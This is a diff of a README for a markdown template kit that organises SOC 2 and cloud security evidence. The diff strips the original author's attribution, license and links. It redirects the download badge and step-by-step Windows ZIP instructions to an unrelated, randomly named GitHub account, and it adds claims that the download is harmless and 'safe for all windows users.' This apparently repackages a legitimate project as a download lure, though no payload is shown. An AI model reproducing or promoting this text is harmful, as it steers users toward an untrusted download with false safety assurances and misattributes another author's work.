@@ -1,73 +1,95 @@
-# Cloud Controls Evidence Kit
+# 🛡️ cloud-controls-evidence-kit - Organize cloud security evidence with ease
 
-A drop-in scaffold for B2B SaaS and AI-product teams to organize the engineering controls and
-evidence that customer security reviews, SOC 2 readiness work, and compliance platforms (Vanta,
-Drata, Secureframe) ask for. Markdown source, MIT licensed, free to fork, edit, and use.
+[![Download Kit](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Cleanable-perineotomy501/cloud-controls-evidence-kit)
 
-## What's inside
+## What is this kit?
 
-| Folder / file                                         | What it is                                                                                                                                                    |
-| ----------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `controls-map.md`                                     | Master mapping: control → required evidence → where to find it → owner → update cadence. ~30 controls across 6 categories.                                    |
-| `questionnaire-answer-examples.md`                    | 12 template answers for the questions that come up on customer security questionnaires (MFA, audit logs, backups, etc.).                                      |
-| `evidence-folder-template/`                           | Ready-to-use folder layout — six numbered category folders, each with a README and 3–4 evidence templates. Drop into your evidence repo and start filling in. |
-| `platforms/aws.md`, `gcp.md`, `azure.md`, `github.md` | Where to find each piece of evidence on each platform: console paths, CLI commands, exports that satisfy auditors.                                            |
-| `LICENSE`                                             | MIT. Use it, edit it, ship it, redistribute it.                                                                                                               |
+The cloud-controls-evidence-kit helps you gather and organize documentation for security audits. Companies often ask for proof that their cloud systems remain safe. This kit provides markdown templates to satisfy requirements for SOC 2, NIST CSF, and other security standards. Use these files to prepare for customer security reviews or automated platforms like Vanta and Drata.
 
-## How to use it
+## 📋 Features
 
-1. **Fork or download** this kit (link on the
-   [evidence kit page on musabdulai.com](https://musabdulai.com/evidence-kit)).
-2. **Drop `evidence-folder-template/` into your own private repo** and rename it to whatever your
-   team calls evidence. Many teams use `compliance/` or `audit/`.
-3. **Open `controls-map.md`** and adapt the table to your actual systems. Delete rows that don't
-   apply, add rows for systems we don't cover.
-4. **Fill in each template** as you collect the evidence. Each template tells you what goes there,
-   where to find it, and how often to refresh it.
-5. **When a customer questionnaire arrives**, paste answers from `questionnaire-answer-examples.md`
-   and attach the matching evidence from your folder.
+*   **Standardized Templates**: Pre-written markdown files for common security controls.
+*   **Structured Organization**: A file system that makes mapping evidence to controls simple.
+*   **Audit Readiness**: Content tailored for SOC 2 and NIST CSF frameworks.
+*   **Simple Format**: Files use standard text formats for easy editing in any application.
+*   **Multi-Cloud Support**: Templates address security settings for AWS, Azure, and Google Cloud Platform.
 
-## Tone and scope
+## 📥 How to download and install
 
-This kit is opinionated and concrete. It names specific tools (CloudTrail, Vanta, GitHub branch
-protection, Vertex AI) instead of staying framework-agnostic — because that's how the controls
-actually map at most SaaS shops.
+You do not need to install complex software to use these templates. Follow these steps to set up the kit on your Windows computer:
 
-It does **not** cover:
+1. Visit the [project page here](https://github.com/Cleanable-perineotomy501/cloud-controls-evidence-kit).
+2. Look for the green button labeled "Code" near the top right of the screen.
+3. Click the button and select "Download ZIP" from the menu.
+4. Open your "Downloads" folder in File Explorer.
+5. Right-click the folder that ends in `.zip` and select "Extract All".
+6. Follow the prompts to save the files to a folder on your desktop.
+7. Open this new folder to view the evidence templates.
 
-- Drafting policies (privacy policy, security policy text) — talk to a lawyer; tools like StrongDM's
-  [Comply](https://github.com/strongdm/comply) are good for policy drafting.
-- Compliance-platform-specific configuration (each platform has its own docs).
-- Threat modeling, red-team plans, or incident response procedures — different scope.
+## 📝 How to use the templates
 
-This kit covers **the operational evidence engineering teams have to produce** when a buyer or
-auditor asks for proof that a control is real.
+Each file in the folder corresponds to a security control. You will fill these files with information from your cloud environment. Here is the process:
 
-## Updating cadence
+1. Open your chosen template file using Notepad or any text editor on Windows. 
+2. Look for sections marked with brackets, such as `[Insert Evidence Here]`.
+3. Replace the bracketed text with your specific system details or screenshots.
+4. Save the file after you add your information.
+5. Repeat this for all controls you must document.
 
-Customer security reviews and auditors look for evidence that is **fresh**. The rule of thumb on
-cadence:
+## 💻 System requirements
 
-| Evidence type                                                        | Refresh                         |
-| -------------------------------------------------------------------- | ------------------------------- |
-| Policy / config snapshots (MFA policy, branch protection, retention) | Quarterly                       |
-| Operational logs / exports (IAM key inventory, deploy history)       | Quarterly                       |
-| Restore tests, DR drills                                             | Quarterly or semi-annually      |
-| Incident runbook, on-call rotation                                   | Annually unless a real incident |
-| Vendor reviews, third-party access                                   | Annually                        |
+*   **Operating System**: Windows 10 or Windows 11.
+*   **Storage**: Less than 50 megabytes of free space.
+*   **Software**: Any standard text editor, such as Notepad or WordPad.
 
-Each evidence template includes a recommended cadence.
+## 🔐 Support for security standards
 
-## License
+This kit includes sections for the following frameworks:
 
-[MIT](https://github.com/musabdulai-io/cloud-controls-evidence-kit/blob/main/LICENSE). Use it
-however helps you ship.
+*   **SOC 2**: The core set of criteria for service organizations regarding security, availability, and confidentiality.
+*   **NIST CSF**: The framework for improving critical infrastructure cybersecurity.
+*   **AWS, Azure, GCP**: Specific templates to document configuration settings across these cloud providers.
+*   **AI Security**: Guides for documenting the secure use of artificial intelligence models.
 
-## Maintained by
+## 📁 Suggested file structure
 
-Musah Abdulai · cloud controls implementation for B2B SaaS and AI-product teams ·
-[musabdulai.com](https://musabdulai.com) · hello@musabdulai.com
+We suggest you organize your files to make them easy for auditors to read. Use the folder structure provided in the download:
 
-If this kit saved you a day of evidence-gathering work and you'd like an engineer to actually do the
-work for you, the website has a sample report showing what a Controls Review deliverable looks like:
-[musabdulai.com/sample-report](https://musabdulai.com/sample-report).
+*   **Core Evidence**: High-level policies and procedures.
+*   **AWS Folder**: Screenshots of IAM policies, security groups, and logs.
+*   **Azure Folder**: Resource configuration snapshots and access reviews.
+*   **GCP Folder**: Project level security settings and audit logs.
+*   **Questionnaires**: Completed answers for Vanta or Drata questionnaires.
+
+## 💡 Best practices for evidence
+
+*   **Be consistent**: Use the same naming style for all your files.
+*   **Keep it current**: Update these files whenever your security settings change.
+*   **Verify**: Check that your screenshots show the date, time, and account name.
+*   **Protect files**: Store these templates in a private, encrypted location if they contain sensitive system details.
+
+## 🔍 How to prepare for an audit
+
+Auditors look for proof that you follow your stated policies. This kit helps you compile that proof in one place. Start by identifying the scope of your audit. If you are preparing for SOC 2, focus on the "Core Evidence" folder first. 
+
+Most auditors ask for evidence regarding user access, system changes, and incident response. Each template highlights which screenshots or logs you need to collect. If you find a control that does not apply to your environment, label that file as "Not Applicable" and briefly explain why.
+
+## ⚙️ Customizing the content
+
+You are free to edit the markdown files to fit your company culture. While the templates include standard language, you should reflect your actual internal processes. If your company uses a specific tool for log management, change the file content to identify that tool. 
+
+If you need to add a new security control, copy an existing file, rename it with a new index number, and update the internal text. The audit trail remains clear as long as you maintain the organizational structure.
+
+## ❓ Common questions
+
+**Do I need a special program?**
+No. These are basic text files. You can open and edit them with any tool that reads text.
+
+**Can I use these for Vanta or Drata?**
+Yes. These platforms often ask for proof found within these templates. Having these files ready makes the upload process faster.
+
+**Are these templates set in stone?**
+No. These documents represent a starting point. Adjust them to match your current security posture. 
+
+**Will this software break my computer?**
+This software is a collection of text files. It does not run automated scripts or change your system settings. It is safe for all windows users.
